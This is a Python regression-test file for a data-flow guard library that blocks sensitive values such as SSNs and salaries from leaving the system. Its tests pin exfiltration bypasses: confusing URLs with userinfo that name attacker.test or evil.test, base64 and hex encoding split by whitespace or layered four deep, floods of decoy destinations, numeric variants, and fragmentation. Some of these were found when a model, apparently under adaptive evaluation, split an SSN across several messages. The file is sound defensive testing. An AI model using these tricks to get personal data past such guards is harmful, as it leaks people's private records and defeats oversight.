"""Regression tests for concrete bypasses an adversarial review found in this library
(see docs/THREAT_MODEL.md "Findings from adversarial review"). Each of these was a working
leak or false positive before the fix; they stay pinned here so they cannot silently return.
"""

import base64

import pytest

from flowguard import FlowBlocked, Guard, Policy, hostname

SSN = "123-45-6791"
POLICY = Policy.from_dict(
    {"destinations": {"partner": "CONFIDENTIAL"}, "fields": {"ssn": "HIGHLY_SENSITIVE", "salary": "SENSITIVE"}}
)


@pytest.fixture
def guard():
    g = Guard(POLICY)
    g.observe({"ssn": SSN}, source="hr")
    return g


# -- 1. URL userinfo/backslash parsing divergence from requests/urllib3 -----------------


@pytest.mark.parametrize(
    "url",
    [
        "http://127.0.0.1:9" + chr(92) + "@trusted.corp.example/x",
        "http://trusted.corp.example" + chr(92) + "@127.0.0.1:9/x",
        "http://attacker.test" + chr(92) + "@trusted.corp.example/x",
    ],
)
def test_backslash_userinfo_no_longer_reads_as_the_trusted_host(url):
    """`urlparse` and `requests`/`urllib3` disagree about text before `\\@`; the fix is to
    treat any URL with credentials-like `@` syntax as unknown (PUBLIC only) rather than pick
    a specific interpretation that might not match the HTTP client actually used."""
    assert hostname(url) == ""


def test_userinfo_url_is_blocked_end_to_end(guard):
    @guard.sink(lambda url: hostname(url))
    def http_post(url, body):
        return "sent"

    with pytest.raises(FlowBlocked):
        http_post("http://evil.test" + chr(92) + "@partner/x", SSN)


# -- 2. whitespace-split base64/hex tokens (bytes.fromhex / b64decode ignore whitespace) --


def test_newline_split_base64_is_still_caught(guard):
    encoded = base64.b64encode(SSN.encode()).decode()
    payload = "\n".join(encoded[i : i + 4] for i in range(0, len(encoded), 4))
    assert base64.b64decode(payload) == SSN.encode()  # the recipient recovers it trivially
    assert guard.check("partner", payload).blocked


def test_space_split_hex_is_still_caught(guard):
    token = SSN.encode().hex()
    payload = " ".join(token[i : i + 2] for i in range(0, len(token), 2))
    assert bytes.fromhex(payload) == SSN.encode()
    assert guard.check("partner", payload).blocked


# -- 3. four-layer base64 (depth was capped at 3) ----------------------------------------


def test_four_layer_base64_is_still_caught(guard):
    text = SSN
    for _ in range(4):
        text = base64.b64encode(text.encode()).decode()
    assert guard.check("partner", text).blocked


# -- 4. flooding destination names to evict an in-progress fragment's stitching state ----


def test_fragment_survives_a_flood_of_decoy_destinations(guard):
    """The original finding: send a first fragment, then check() over 1024 throwaway
    destinations (more than the tracking cap) before sending the fragment that completes it."""
    assert guard.check("partner", "123-45 ").allowed  # fragment 1: not yet a complete secret
    for i in range(1030):
        guard.check(f"decoy{i}.example", "1234")  # crafted to share the secret's own prefix
    assert guard.check("partner", "6791").blocked  # fragment 2: completes it


def test_fragment_survives_decoys_with_equal_coverage_progress(guard):
    """A stronger adversary: decoys chosen to match as much of the secret as the real
    fragment does, not just its first few characters."""
    assert guard.check("partner", "123-45 ").allowed
    for i in range(1500):
        guard.check(f"match{i}.example", "12345")  # same 5 characters as the real fragment
    assert guard.check("partner", "6791").blocked


# -- 5. numeric literal forms: leading zeros and scientific notation --------------------


def test_leading_zero_form_is_caught(guard):
    guard.observe({"salary": 85000}, source="hr")
    assert int("085000") == 85000  # not a different number
    assert guard.check("partner", "085000").blocked


def test_scientific_notation_form_is_caught(guard):
    guard.observe({"salary": 85000}, source="hr")
    assert float("8.5e4") == 85000.0
    assert guard.check("partner", "8.5e4").blocked


def test_trailing_decimal_form_is_caught(guard):
    guard.observe({"salary": 85000}, source="hr")
    assert guard.check("partner", "85000.00").blocked


def test_numeric_form_matching_still_respects_value_boundaries(guard):
    """The fix must not start matching on numeric substrings of unrelated numbers."""
    guard.observe({"salary": 85000}, source="hr")
    assert guard.check("partner", "unrelated id 1850000").allowed
    assert guard.check("partner", "unrelated id 850001").allowed


def test_numeric_form_matching_does_not_misread_hex_as_scientific_notation():
    """Found while regenerating the benchmark: hex-encoding an unrelated PUBLIC name
    coincidentally produced text like "...4a756e2d..." -- read as scientific notation,
    "756e2" is 75600, which happened to equal a *different* employee's tracked salary."""
    guard = Guard(POLICY)
    guard.observe({"salary": 75600}, source="hr")  # some other employee's salary
    hex_of_unrelated_name = "53656f204a756e2d686f"  # hex("Seo Jun-ho"), contains "756e2"
    assert guard.check("partner", hex_of_unrelated_name).allowed


# -- 6/7. all-digit fragmentation surviving unrelated text between pieces --------------


def test_ssn_fragments_with_a_repeated_label_between_them_are_still_caught(guard):
    """Found by the live adaptive-LLM evaluation: the model sent each fragment with the
    same "ssn: " label, which is ordinary behaviour, not an adversarial trick -- and it
    defeated the naive concatenation the stitching check relied on."""
    assert guard.check("partner", {"body": "ssn: 123-45-6"}).allowed
    assert guard.check("partner", {"body": "ssn: 791"}).blocked


def test_short_numeric_fields_now_get_fragment_coverage_too(guard):
    """Found by the same adaptive run: salary (5 digits) was too short to be indexed by the
    fragmentation mechanism at all (an 8-digit minimum, sized for the non-digit case), so a
    model splitting it into small pieces was never blocked. Fixed with a lower, still-safe
    minimum for the digit-boundary-safe path specifically."""
    guard.observe({"salary": 85000}, source="hr")
    assert guard.check("partner", {"body": "8"}).allowed
    assert guard.check("partner", {"body": "5000"}).blocked


def test_decoy_destinations_no_longer_evict_a_digit_fragment_via_buffer_length(guard):
    """A consequence of the fix above: a real fragment now earns confirmed coverage
    progress, which eviction priority weighs far above any decoy's buffer length."""
    assert guard.check("partner", SSN[:6]).allowed
    for i in range(1500):
        guard.check(f"decoy{i}.example", "x" * 500)  # far longer buffer, but no real overlap
    assert guard.check("partner", SSN[6:]).blocked
